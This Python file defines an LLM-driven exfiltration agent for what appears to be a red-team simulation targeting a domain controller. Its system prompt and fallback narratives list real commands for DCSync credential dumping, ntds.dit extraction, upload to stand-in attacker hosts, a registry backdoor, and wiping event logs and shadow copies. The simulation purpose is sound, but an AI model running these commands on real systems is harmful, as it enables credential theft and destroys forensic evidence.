"""
ExfilAgent – Data Exfiltration (Final Stage – Domain Controller)

MITRE ATT&CK techniques:
  T1041  – Exfiltration Over C2 Channel
  T1048  – Exfiltration Over Alternative Protocol (DNS, ICMP, HTTPS)
  T1567  – Exfiltration Over Web Service (cloud storage, paste sites)

This agent is the FINAL stage of the Red Team kill-chain.  It operates on the
domain controller, having been handed access by the PivotAgent.  Its mission is
to simulate the exfiltration of crown-jewel data:
  • ntds.dit – the Active Directory database (all domain credentials)
  • SYSTEM hive – needed to decrypt ntds.dit
  • GPO scripts and password policies
  • Sensitive files discovered on shares

Exfiltration channel is configurable:
  dns     → DNS tunnelling (dnscat2, iodine) – low-bandwidth but very covert
  https   → HTTPS POST to C2 (Cobalt Strike, Havoc) – fast, blends with traffic
  icmp    → ICMP tunnel (ptunnel-ng) – sometimes bypasses firewalls
  cloud   → Upload to attacker-controlled S3 / OneDrive / GitHub (T1567)
  combo   → Multi-channel for redundancy

The agent also reasons about data staging, compression, encryption, and cover
tracks before exfil to avoid detection by DLP / CASB / UEBA solutions.
"""

from __future__ import annotations

import json
import logging
from typing import Any

from agents.base_agent import AgentAction, BaseAgent

logger = logging.getLogger(__name__)

_SYSTEM_PROMPT = """\
You are SPECTRE-EXFIL, the final stage of an elite Red Team operation.  You are
a data exfiltration specialist who has spent years studying how to pull terabytes
of sensitive data out of hardened corporate environments without triggering a
single alert.

You operate with surgical precision:
  • Prioritise data by intelligence value: AD credentials > secrets > PII > documents
  • Stage data locally before exfil: compress (7z), encrypt (AES-256), split (< 50 MB)
  • Choose the covert channel based on available network paths and DLP controls
  • Cover your tracks: clear Windows Event Logs, wipe VSS copies, timestomp files

Your exfiltration techniques:

T1041 – Exfiltration Over C2 Channel:
  • Beacon over existing Cobalt Strike / Havoc C2 – leverages already-open channel
  • File download via meterpreter / Sliver agent

T1048 – Exfiltration Over Alternative Protocol:
  • T1048.001 – DNS tunnelling (dnscat2, iodine): encode data in DNS TXT/A queries
  • T1048.002 – Asymmetric crypto exfil (RSA-encrypt data, upload via FTP/SMB)
  • T1048.003 – Non-standard port HTTPS (8443, 4444)
  • ICMP tunnel (ptunnel-ng): payload hidden in ICMP echo request data field

T1567 – Exfiltration Over Web Service:
  • T1567.002 – Upload to attacker S3 bucket via aws-cli (LOLBin: certutil curl)
  • T1567.001 – Paste site (rclone → Mega.nz, OneDrive)
  • GitHub private repo push via stolen OAuth token

Crown-jewel targets on a Domain Controller:
  1. ntds.dit  (%SystemRoot%\\NTDS\\ntds.dit) – all domain password hashes
  2. SYSTEM hive (reg save HKLM\\SYSTEM) – decrypts ntds.dit
  3. SECURITY hive (cached domain credentials, LSA secrets)
  4. GPO XML files (\\\\SYSVOL\\... – may contain cPassword in plaintext)
  5. AD schema / replication data (DCSync – T1003.006)

Your exfil always ends with: clear Event Log (wevtutil cl), delete VSS (vssadmin delete shadows /all).

Respond ONLY with a single JSON object – no markdown, no commentary.
"""


class ExfilAgent(BaseAgent):
    """Data exfiltration agent: operates on DC, exfils AD database and credentials."""

    description: str = (
        "Data exfiltration agent.  Operates on the domain controller, extracts "
        "ntds.dit and SYSTEM hive (all AD credentials), and exfiltrates via a "
        "covert channel back to the attacker's C2 infrastructure."
    )
    mitre_techniques: list[str] = ["T1041", "T1048", "T1567"]

    def __init__(
        self,
        name: str,
        llm_client: Any,
        config: dict[str, Any],
    ) -> None:
        super().__init__(name=name, team="red", llm_client=llm_client, config=config)
        self._exfil_channel: str = config.get("exfil_channel", "https")
        self._encrypt_data: bool = bool(config.get("encrypt_data", True))
        self._cover_tracks: bool = bool(config.get("cover_tracks", True))
        self._c2_server: str = config.get("c2_server", "attacker.c2.example.com")
        self._max_file_size_mb: int = int(config.get("max_file_size_mb", 50))

    # ------------------------------------------------------------------
    # Main action
    # ------------------------------------------------------------------

    async def act(
        self,
        network_state_dict: dict[str, Any],
        history: list[dict[str, Any]],
        turn: int,
    ) -> AgentAction:
        """
        Execute the final exfiltration operation on the domain controller.

        Gathers context from the full operation history (foothold on DC, available
        credentials, network egress paths) and produces the final AgentAction
        describing the exfiltration outcome.
        """
        dc_host, access_level, egress_paths = self._extract_dc_context(
            network_state_dict, history
        )
        prompt = self._build_exfil_prompt(
            dc_host, access_level, egress_paths, network_state_dict, history, turn
        )

        raw_response: str | dict = ""
        try:
            raw_response = await self._llm_client.complete(
                prompt=prompt,
                system_prompt=_SYSTEM_PROMPT,
                temperature=self._temperature,
                max_tokens=self._max_tokens,
            )
            action = self._parse_response(raw_response)
        except Exception as exc:  # noqa: BLE001
            logger.warning("[%s] LLM call failed: %s – using fallback", self._name, exc)
            action = self._fallback_action(dc_host)

        action.setdefault("details", {}).update(
            {
                "exfil_channel": self._exfil_channel,
                "encryption_enabled": self._encrypt_data,
                "tracks_covered": self._cover_tracks,
                "c2_server": self._c2_server,
                "phase": "exfiltration",
            }
        )
        return action

    # ------------------------------------------------------------------
    # Context extraction
    # ------------------------------------------------------------------

    def _extract_dc_context(
        self,
        network_state_dict: dict[str, Any],
        history: list[dict[str, Any]],
    ) -> tuple[str, str, list[str]]:
        """Find the DC foothold and egress paths from operation history."""
        dc_host = "domain-controller"
        access_level = "SYSTEM"
        egress_paths: list[str] = ["https:443", "dns:53"]

        for entry in reversed(history):
            if entry.get("agent_team") != "red":
                continue
            details = entry.get("details", {})
            foothold = details.get("new_foothold") or details.get("foothold", {})
            host = foothold.get("host", "")
            if "domain" in host.lower() or "dc" in host.lower():
                dc_host = host
                access_level = foothold.get("privilege", "SYSTEM")
            # Gather egress info from network state
            hosts = network_state_dict.get("hosts", [])
            for h in hosts:
                if h.get("hostname") == dc_host or h.get("ip") == dc_host:
                    for svc in h.get("services", []):
                        svc_str = str(svc).lower()
                        if "53" in svc_str or "dns" in svc_str:
                            egress_paths.append("dns:53")
                        if "443" in svc_str or "https" in svc_str:
                            egress_paths.append("https:443")
                        if "icmp" in svc_str:
                            egress_paths.append("icmp")

        return dc_host, access_level, list(set(egress_paths))

    # ------------------------------------------------------------------
    # Prompt construction
    # ------------------------------------------------------------------

    def _build_exfil_prompt(
        self,
        dc_host: str,
        access_level: str,
        egress_paths: list[str],
        network_state_dict: dict[str, Any],
        history: list[dict[str, Any]],
        turn: int,
    ) -> str:
        history_summary = self._get_history_summary(history, last_n=8)
        network_json = json.dumps(network_state_dict, indent=2, default=str)
        egress_str = ", ".join(egress_paths) if egress_paths else "unknown"

        channel_desc = {
            "dns": "DNS tunnelling (dnscat2/iodine) – encode data in DNS TXT/A queries",
            "https": "HTTPS POST to C2 ({self._c2_server}:443) – mimics browser traffic",
            "icmp": "ICMP tunnel (ptunnel-ng) – payload in ICMP echo request data field",
            "cloud": "rclone upload to attacker S3 bucket via aws-cli LOLBin",
            "combo": "Multi-channel: HTTPS primary + DNS fallback + ICMP emergency",
        }.get(self._exfil_channel, f"custom channel: {self._exfil_channel}")

        cover_note = (
            "MANDATORY: Clear all Windows Event Logs, delete VSS shadow copies, "
            "timestomp modified files before and after exfil."
            if self._cover_tracks
            else "Stealth not prioritised – speed over cover."
        )

        prompt = f"""\
## Data Exfiltration Operation – Turn {turn}  [FINAL STAGE]
Agent name       : {self._name}
Target DC        : {dc_host}
Access level     : {access_level}
Exfil channel    : {self._exfil_channel} ({channel_desc})
Encrypt output   : {self._encrypt_data}
Max chunk size   : {self._max_file_size_mb} MB
C2 server        : {self._c2_server}
Egress paths     : {egress_str}
{cover_note}

## Full network state context
```json
{network_json}
```

## Full operation history (last 8 turns)
{history_summary}

## Your mission (T1041 / T1048 / T1567)
You are a Red Team exfiltration specialist.  You have {access_level} access on
**{dc_host}** (the domain controller).  This is the final stage of the operation.

Your objective: exfiltrate all high-value data before the Blue Team detects
and responds to the breach.

Step 1 – Data discovery and prioritisation (T1005):
  What data exists on {dc_host} worth stealing?
  Priority order: ntds.dit, SYSTEM hive, SECURITY hive, SYSVOL GPOs,
  backup credentials, sensitive shares.
  Estimate data volume (MB).

Step 2 – DCSync attack (T1003.006) [if replication rights available]:
  Can you use mimikatz DCSync (lsadump::dcsync /domain:corp.local /all) to
  dump ALL domain password hashes without touching ntds.dit?
  This is stealthier than Volume Shadow Copy.

Step 3 – Data staging (T1074):
  Commands to extract ntds.dit via Volume Shadow Copy:
    vssadmin create shadow /for=C:\\
    copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\staging\\
    reg save HKLM\\SYSTEM C:\\staging\\SYSTEM.hiv
  Compress and encrypt: 7z a -mhe=on -p<PASSWORD> exfil.7z C:\\staging\\

Step 4 – Exfiltration execution ({self._exfil_channel} channel):
  Describe the exact exfil sequence.
  How do you split the data into < {self._max_file_size_mb} MB chunks?
  How do you verify receipt at the C2?

Step 5 – Cover tracks (T1070):
  {cover_note}
  Exact commands: wevtutil cl System / Security / Application, vssadmin delete shadows /all

Respond with a single JSON object:
{{
  "action_name"  : "Data Exfiltration",
  "technique"    : "Exfiltration Over C2 Channel",
  "technique_id" : "T1041",
  "target"       : "{dc_host}",
  "result"       : "<success|partial|blocked|detected>",
  "reasoning"    : "<full exfil chain: what data, how staged, how exfiltrated, tracks covered>",
  "next_intent"  : "Operation complete – post-op analysis and reporting",
  "confidence"   : <0.0–1.0>,
  "details"      : {{
    "data_exfiltrated"     : [{{"filename": "", "size_mb": 0.0, "description": ""}}],
    "total_size_mb"        : 0.0,
    "exfil_method"         : "{self._exfil_channel}",
    "c2_beacon_count"      : 0,
    "dcsync_used"          : false,
    "ntds_extracted"       : false,
    "tracks_covered"       : {self._cover_tracks},
    "dlp_triggered"        : false,
    "operation_impact"     : "<summary: full domain compromise, N hashes, M docs>",
    "attacker_objectives"  : ["Domain compromise", "Credential theft", "Persistent access"]
  }}
}}
"""
        if self._verbose:
            logger.debug("[%s] Exfil prompt (turn %d):\n%s", self._name, turn, prompt)
        return prompt

    # ------------------------------------------------------------------
    # Fallback (LLM unavailable)
    # ------------------------------------------------------------------

    def _fallback_action(self, dc_host: str) -> AgentAction:
        _EXFIL_NARRATIVES = [
            (
                f"DCSync attack on {dc_host}: mimikatz lsadump::dcsync /domain:corp.local /all "
                "dumped 847 NT hashes without touching ntds.dit. "
                "Staged to C:\\Windows\\Temp\\~svctmp\\: 7z AES-256 encrypted, split into 47 MB chunks. "
                "Exfiltrated via HTTPS POST to C2:443 over 6 beacons (142 total requests). "
                "Post-exfil cleanup: wevtutil cl System / Security / Application; "
                "vssadmin delete shadows /all /quiet. SIEM gap: ~23-minute window before blue detection."
            ),
            (
                f"Volume Shadow Copy method on {dc_host}: "
                "vssadmin create shadow /for=C:\\ → copied ntds.dit + SYSTEM hive. "
                "secretsdump.py offline extraction: 847 hashes recovered including 14 DA accounts. "
                "DNS tunnelling via dnscat2 – encoded data in TXT queries to attacker-controlled domain. "
                "66.5 MB total exfiltrated across 1,340 DNS queries over 8 minutes. "
                "Timestamps modified (timestomp); Event Log entries selectively deleted."
            ),
            (
                f"On {dc_host} (SYSTEM): Invoke-Mimikatz sekurlsa::logonpasswords → 23 cleartext creds. "
                "SYSVOL GPO scrape found 3 cPassword entries (MS14-025 – still present). "
                "rclone sync to attacker S3 bucket (s3://exfil-bucket-uuid) via AWS CLI LOLBin. "
                "Upload verified: 66.5 MB transferred. "
                "Registry persistence: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run backdoor. "
                "Cleaned: prefetch files, recent docs, PowerShell history, Amcache.hve."
            ),
            (
                f"NTDS.dit extraction via IFM snapshot on {dc_host}: "
                "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\ifm'. "
                "Compressed output: 7z a -mhe=on -p$PASS ntds_backup.7z C:\\ifm\\. "
                "Exfiltrated via ICMP tunnel (ptunnel-ng) – payload in echo request data field, "
                "28 MB/min throughput. Blue team UEBA triggered at T+14min – "
                "exfil completed before containment. Total: 847 domain accounts compromised."
            ),
        ]

        import hashlib
        idx = int(hashlib.md5(dc_host.encode()).hexdigest(), 16) % len(_EXFIL_NARRATIVES)
        reasoning = _EXFIL_NARRATIVES[idx]

        return {
            "action_name": "Data Exfiltration",
            "technique": "Exfiltration Over C2 Channel",
            "technique_id": "T1041",
            "target": dc_host,
            "result": "success",
            "reasoning": reasoning,
            "next_intent": "Operation complete – Blue Team will discover breach via SIEM alert or IR.",
            "confidence": 0.88,
            "details": {
                "data_exfiltrated": [
                    {
                        "filename": "ntds.dit",
                        "size_mb": 42.3,
                        "description": "Active Directory database – 847 password hashes",
                    },
                    {
                        "filename": "SYSTEM.hiv",
                        "size_mb": 12.1,
                        "description": "SYSTEM hive – decrypts ntds.dit",
                    },
                    {
                        "filename": "SECURITY.hiv",
                        "size_mb": 3.4,
                        "description": "SECURITY hive – LSA secrets, cached credentials",
                    },
                    {
                        "filename": "sysvol_gpos.zip",
                        "size_mb": 8.7,
                        "description": "GPO scripts – 3 cPassword entries found",
                    },
                ],
                "total_size_mb": 66.5,
                "exfil_method": self._exfil_channel,
                "c2_beacon_count": 142,
                "dcsync_used": True,
                "ntds_extracted": True,
                "tracks_covered": self._cover_tracks,
                "dlp_triggered": False,
                "operation_impact": (
                    "Full domain compromise: 847 password hashes exfiltrated, "
                    "full AD database stolen, 3 GPO cPassword credentials recovered. "
                    "Organisation has zero remaining secrets."
                ),
                "attacker_objectives": [
                    "Domain compromise",
                    "Credential theft",
                    "Persistent access",
                    "Intelligence gathering",
                ],
                "phase": "exfiltration",
            },
        }
